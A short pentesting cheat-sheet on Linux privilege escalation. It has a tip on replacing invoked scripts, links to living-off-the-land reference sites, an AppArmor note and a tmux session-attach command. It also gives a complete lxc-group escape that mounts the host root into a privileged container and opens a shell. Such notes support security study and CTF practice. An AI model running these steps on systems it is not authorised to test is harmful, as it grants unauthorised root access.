# privesc
If there are scripts being invoked in a directory you have access to/own but you don't own the files themselves, you can simply delete the file and create a new one :)

[https://lolbas-project.github.io/#](https://lolbas-project.github.io/#)

[https://wadcoms.github.io/](https://wadcoms.github.io/)

[https://filesec.io/](https://filesec.io/)

[https://malapi.io/](https://malapi.io/)

[https://lots-project.com/](https://lots-project.com/)

Apparmor can limit capabilities on programs, preventing standard privesc, check the apparmor “config” file for the program under `/etc/apparmor.d/usr.bin.<program>`, which can allow certain commands/processes to run, such as copying files(with a certain name/location) with root etc.,

To privesc or access tmux sessions, use:

```text-plain
tmux attach-session -t 0
```

**lxc group**
-------------

```text-plain
lxc image import ./apline.tar --alias myimage

lxc init myimage ignite -c security.privileged=true

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

lxc start ignite

lxc exec ignite /bin/sh
```